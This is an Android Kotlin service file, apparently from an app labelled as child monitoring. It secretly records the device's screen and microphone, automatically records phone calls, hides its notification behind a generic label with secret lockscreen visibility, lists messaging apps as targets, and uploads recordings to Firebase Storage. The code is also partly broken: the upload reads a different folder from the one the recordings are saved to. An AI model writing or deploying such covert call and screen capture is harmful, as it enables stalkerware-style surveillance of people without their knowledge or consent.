package com.example.childmonitoringapp.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.net.Uri
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.app.Activity
import com.google.firebase.storage.FirebaseStorage
import android.os.Environment

class MonitoringService : Service() {
    private val CHANNEL_ID = "MonitoringChannel"
    private val NOTIFICATION_ID = 1
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var surface: android.view.Surface? = null
    private var virtualDisplay: VirtualDisplay? = null
    private val targetApps = setOf(
        "com.google.android.apps.messaging",
        "com.whatsapp",
        "com.zing.zalo",
        "com.facebook.orca",
        "org.telegram.messenger"
    )
    private val TAG = "MonitoringService"
    private val handler = Handler()
    private var isRecording = false
    private var isCallRecording = false

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        startCallMonitoring()
        Log.d(TAG, "Service created")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("App Running")
            .setContentText("Service is active")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())

        when (intent?.action) {
            "STOP_SCREEN" -> {
                Log.d(TAG, "STOP_SCREEN received")
                stopRecording()
                isRecording = false
                return START_STICKY
            }
            "START_SCREEN" -> {
                if (isRecording) {
                    Log.d(TAG, "Already recording; ignore START")
                    return START_STICKY
                }
                val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
                val data = intent.getParcelableExtra<Intent>("projectionData")
                if (resultCode == Activity.RESULT_OK && data != null) {
                    mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
                    if (mediaProjection != null) {
                        Log.d(TAG, "START_SCREEN -> startScreenRecording()")
                        startScreenRecording()
                    } else {
                        Log.e(TAG, "MediaProjection null")
                    }
                } else {
                    Log.e(TAG, "Missing projection data")
                }
                return START_STICKY
            }
            else -> {
                // Không làm gì khi không có action (tránh auto-start)
                Log.d(TAG, "No-op action=${intent?.action}")
                return START_STICKY
            }
        }
    }

    private fun startScreenRecording() {
        if (mediaRecorder == null && mediaProjection != null && !isRecording) {
//            val directory = filesDir
            val directory = getExternalFilesDir(Environment.DIRECTORY_MOVIES)!!
            if (!directory.exists()) directory.mkdirs()
            val oldFiles = directory.listFiles { _, name -> name.startsWith("screen_record_") }
            oldFiles?.forEach { it.delete() }

            val file = File(directory, "screen_record_${System.currentTimeMillis()}.mp4")
            Log.d(TAG, "Saving screen to: ${file.absolutePath}")

//            val densityDpi = resources.displayMetrics.densityDpi
//
//            mediaRecorder = MediaRecorder().apply {
//                setVideoSource(MediaRecorder.VideoSource.SURFACE)
//                setAudioSource(MediaRecorder.AudioSource.MIC)
//                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
//                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
//                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
//                setVideoSize(720, 1280)
//                setVideoFrameRate(30)                // tăng từ 12 → 30 fps cho chắc
//                setVideoEncodingBitRate(5_000_000)   // tăng bitrate để hình rõ hơn
//                setOutputFile(file.absolutePath)
//
//                try {
//                    Log.d(TAG, "prepare()")
//                    prepare()
//                    this@MonitoringService.surface = this.surface
//
//                    Log.d(TAG, "createVirtualDisplay($densityDpi dpi)")
//                    this@MonitoringService.virtualDisplay = mediaProjection?.createVirtualDisplay(
//                        "ScreenCapture",
//                        720, 1280, densityDpi, // ✅ dùng dpi thật
//                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
//                        this@MonitoringService.surface!!,
//                        null,
//                        null
//                    )
//
//                    if (this@MonitoringService.virtualDisplay == null) {
//                        Log.e(TAG, "Failed to create VirtualDisplay")
//                        throw IllegalStateException("VirtualDisplay is null")
//                    }
//
//                    Log.d(TAG, "start()")
//                    start()
//                    Log.d(TAG, "Screen recording started")
//                    isRecording = true
//                    startRecordingTimer(120000) // 2 phút
//                } catch (e: Exception) {
//                    Log.e(TAG, "Failed to start screen recording: ${e.message}")
//                    stopRecording()
//                    file.delete()
//                    mediaRecorder = null
//                }
            val densityDpi = resources.displayMetrics.densityDpi

            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(720, 1280)
                setVideoFrameRate(30)                // tăng từ 12 → 30 fps cho chắc
                setVideoEncodingBitRate(5_000_000)   // tăng bitrate để hình rõ hơn
                setOutputFile(file.absolutePath)

                try {
                    Log.d(TAG, "prepare()")
                    prepare()
                    this@MonitoringService.surface = this.surface

                    Log.d(TAG, "createVirtualDisplay($densityDpi dpi)")
                    this@MonitoringService.virtualDisplay = mediaProjection?.createVirtualDisplay(
                        "ScreenCapture",
                        720, 1280, densityDpi, // ✅ dùng dpi thật
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        this@MonitoringService.surface!!,
                        null,
                        null
                    )

                    if (this@MonitoringService.virtualDisplay == null) {
                        Log.e(TAG, "Failed to create VirtualDisplay")
                        throw IllegalStateException("VirtualDisplay is null")
                    }

                    Log.d(TAG, "start()")
                    start()
                    Log.d(TAG, "Screen recording started")
                    isRecording = true
                    startRecordingTimer(120000) // 2 phút
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start screen recording: ${e.message}")
                    stopRecording()
                    file.delete()
                    mediaRecorder = null
                }
            }


        } else {
            if (mediaRecorder != null) {
                Log.w(TAG, "MediaRecorder is already in use, stopping previous recording")
                stopRecording()
            }
            if (mediaProjection == null) {
                Log.w(TAG, "MediaProjection is null")
            }
        }
    }

    private fun startRecordingTimer(durationMs: Long) {
        handler.postDelayed({
            if (isRecording) {
                Log.d(TAG, "Recording stopped after 2 minutes")
                stopRecording()
                isRecording = false
                uploadToFirebase()
            }
        }, durationMs)
    }

    private fun uploadToFirebase() {
        val storage = FirebaseStorage.getInstance()
        val storageRef = storage.reference
        val directory = filesDir
        val files = directory.listFiles { _, name -> name.startsWith("screen_record_") }
        files?.forEach { file ->
            if (file.length() > 0) {
                Log.d(TAG, "Uploading file: ${file.name}")
                val videoRef = storageRef.child("videos/${file.name}")
                val uploadTask = videoRef.putFile(Uri.fromFile(file))

                uploadTask.addOnSuccessListener {
                    Log.d(TAG, "Upload to Firebase successful for ${file.name}")
                    file.delete() // Xóa file sau khi upload
                }.addOnFailureListener { exception ->
                    Log.e(TAG, "Upload to Firebase failed for ${file.name}: ${exception.message}")
                }
            } else {
                Log.w(TAG, "File ${file.name} is empty, skipping upload")
                file.delete()
            }
        }
    }

    private fun startCallRecording() {
        if (mediaRecorder == null && !isCallRecording) {
            val file = File(filesDir, "call_record_${System.currentTimeMillis()}.mp4")
            Log.d(TAG, "Saving call to: ${file.absolutePath}")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(if (Build.VERSION.SDK_INT < 29) MediaRecorder.AudioSource.VOICE_CALL else MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                try {
                    prepare()
                    start()
                    Log.d(TAG, "Call recording started")
                    isCallRecording = true
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start call recording: ${e.message}")
                    stopRecording()
                }
            }
        }
    }

    private fun stopCallRecording() {
        if (isCallRecording) {
            stopRecording()
            isCallRecording = false
            Log.d(TAG, "Call recording stopped")
        }
    }

    private fun startCallMonitoring() {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            telephonyManager.registerTelephonyCallback(mainExecutor, object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                override fun onCallStateChanged(state: Int) {
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK, TelephonyManager.CALL_STATE_RINGING -> {
                            Log.d(TAG, "Call detected, starting recording")
                            startCallRecording()
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            Log.d(TAG, "Call ended, stopping recording")
                            stopCallRecording()
                        }
                    }
                }
            })
        } else {
            telephonyManager.listen(object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK, TelephonyManager.CALL_STATE_RINGING -> {
                            Log.d(TAG, "Call detected, starting recording")
                            startCallRecording()
                        }
                        TelephonyManager.CALL_STATE_IDLE -> {
                            Log.d(TAG, "Call ended, stopping recording")
                            stopCallRecording()
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        stopRecording()
        mediaProjection?.stop()
        mediaProjection = null
        stopSelf()
        Log.d(TAG, "Task removed, service stopped and resources released")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
        mediaProjection?.stop()
        mediaProjection = null
        Log.d(TAG, "Service destroyed and resources released")
    }

    private fun stopRecording() {
        mediaRecorder?.apply {
            try {
                stop()
                reset()
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping recording: ${e.message}")
            } finally {
                release()
                this@MonitoringService.surface?.release()
                this@MonitoringService.surface = null
                this@MonitoringService.virtualDisplay?.release()
                this@MonitoringService.virtualDisplay = null
                Log.d(TAG, "Recording stopped and released")
            }
        }
        mediaRecorder = null
    }

    override fun onBind(intent: Intent?): IBinder? = null
}